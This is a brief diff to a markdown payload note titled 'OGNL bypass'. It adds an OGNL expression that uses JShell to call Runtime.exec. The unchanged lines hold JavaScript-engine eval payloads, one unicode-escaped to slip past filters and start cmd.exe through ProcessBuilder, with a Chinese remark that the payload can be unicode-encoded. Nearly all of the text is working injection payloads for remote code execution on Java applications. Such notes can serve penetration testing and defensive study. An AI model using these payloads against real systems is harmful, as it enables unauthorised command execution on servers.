@@ -1,5 +1,7 @@
 # OGNL bypass
 ```java
+${@jdk.jshell.JShell@create().eval('java.lang.Runtime.getRuntime().exec("")}
+
 new javax.script.ScriptEngineManager().getEngineByName("js").eval(此处的Payload可以进行unicode编码)
 
 new javax.script.ScriptEngineManager().getEngineByName("js").eval("new j\u0061va.lang.ProcessBuilder['(java.l\u0061ng.String[])'](['cmd.exe','/c','calc']).start()\u003B");
